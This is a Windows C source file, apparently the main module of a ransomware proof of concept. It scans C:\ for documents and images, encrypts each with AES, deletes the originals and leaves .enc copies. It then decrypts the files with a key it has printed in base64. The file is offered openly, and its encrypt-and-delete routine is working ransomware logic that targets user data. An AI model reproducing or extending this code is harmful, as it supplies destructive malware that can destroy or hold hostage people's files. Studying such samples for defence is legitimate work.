#include <Windows.h>
#include <stdio.h>
#include "crypto/crypto.h"
#include "crypto/encoding.h"
#include "util/fs.h"

// Encrypted data
LPWSTR* g_foundFiles        = NULL;
SIZE_T  g_foundFilesCount   = 0;

// Encoded key, testing the base64 key encoding code
#define ENC_KEY_SIZE 128
CHAR g_encKey[ENC_KEY_SIZE];

// Example 
LPWSTR  g_directory         = L"C:\\";     // any path
LPCWSTR g_targetExtsEnc     = L".txt;.png;.docx;.jpg"; // extensions separated by `;`
LPCWSTR g_targetExtsDec     = L".enc";            // same here but generally you'll 
                                                  // have only one extension for enc files

BOOL FetchFiles() {
    // Use this to get the user files
    //LPWSTR directory = NULL;
    //if (!FS_GetCurrentUserPath(&directory)) {
    //    return FALSE;
    //}

    // Skip protected files, like system files, you need admin perms for that.
    const BOOL skipProtected = TRUE;
    return FS_QueryFilesWithExt(
        g_directory, g_targetExtsEnc, skipProtected,
        &g_foundFiles, &g_foundFilesCount
    );
}

BOOL EncryptFiles() {
    BYTE key[AES_KEY_SIZE];
    BYTE iv[AES_BLOCK_SIZE];

    // Generate random key
    if (!CT_GenerateKeyIVPair(key, AES_KEY_SIZE, iv, AES_BLOCK_SIZE)) {
        return FALSE;
    }

    // Derive the base64 key from the generated one
    if (!EC_DeriveBase64Key(g_encKey, ENC_KEY_SIZE, key, AES_KEY_SIZE, iv, AES_BLOCK_SIZE)) {
        return FALSE;
    }

    printf("Derived base64 encoded key: %s\n", g_encKey);

    for (SIZE_T i = 0; i < g_foundFilesCount; i++) {
        WCHAR outFile[MAX_PATH] = { 0 };
        // Truncate .enc from the encrypted file
        wcsncpy_s(outFile, MAX_PATH, g_foundFiles[i], _TRUNCATE);
        wcsncat_s(outFile, MAX_PATH, g_targetExtsDec, _TRUNCATE);

        // Encrypt
        CryptoError encRes = CT_EncryptFile(g_foundFiles[i], outFile, 
            key, AES_KEY_SIZE, iv, AES_BLOCK_SIZE);
        if (encRes == CT_OK) {
            printf("Encrypted file: %ws\n", g_foundFiles[i]);
        }
        else continue; // Skip file if failed

        // Delete original file
        DeleteFileW(g_foundFiles[i]);
    }

    return TRUE;
}

BOOL DecryptFiles() {
    LPWSTR* foundFiles = NULL;
    SIZE_T  foundFilesCount = 0;

    const BOOL skipProtected = TRUE;
    // Here i requery the encrypted files with the .enc extension
    if (!FS_QueryFilesWithExt(
        g_directory, g_targetExtsDec, skipProtected,
        &foundFiles, &foundFilesCount
    )) {
        return FALSE;
    }
    
    // Holds the unpacked key
    BYTE key[AES_KEY_SIZE];
    BYTE iv[AES_BLOCK_SIZE];
    
    // These are used as both in and out params,
    // They must be set to the original size.
    // See EC_UnpackBase64Key
    SIZE_T keyLen = AES_KEY_SIZE;
    SIZE_T ivLen = AES_BLOCK_SIZE;

    // Unpack the base64 key into binary
    if (!EC_UnpackBase64Key(g_encKey, key, &keyLen, iv, &ivLen)) {
        return FALSE;
    }

    // If the key is valid, the size should be the same.
    if (keyLen != AES_KEY_SIZE || ivLen != AES_BLOCK_SIZE) {
        return FALSE;
    }

    for (SIZE_T i = 0; i < foundFilesCount; i++) {
        // Remove the .enc extension and push the new name into a new string
        WCHAR outFile[MAX_PATH] = { 0 };
        wcsncpy_s(outFile, MAX_PATH, foundFiles[i], lstrlenW(foundFiles[i]) - lstrlenW(g_targetExtsDec));

        // Decrypt
        CryptoError decRes = CT_DecryptFile(foundFiles[i], outFile,
            key, AES_KEY_SIZE, iv, AES_BLOCK_SIZE);
        if (decRes == CT_OK) {
            printf("Decrypted file: %ws\n", foundFiles[i]);
            // Remove old encrypted file
            DeleteFileW(foundFiles[i]);
        }
        else continue; // Skip file if failed
    }

    return TRUE;
}

int main(void) {
    printf("=== Scanning files ===\n");
    if (!FetchFiles()) {
        printf("Error fetching files.\n");
        return 1;
    }
    printf("Found %llu files.\n", g_foundFilesCount);

    printf("\n=== Encryption ===\n");
    if (!EncryptFiles()) {
        printf("Error encrypting files.\n");
        return 1;
    }

    printf("\n=== Decryption ===\n");
    if (!DecryptFiles()) {
        printf("Error decrypting files.\n");
        return 1;
    }

    printf("\n*** DONE *** \n");
    return 0;
}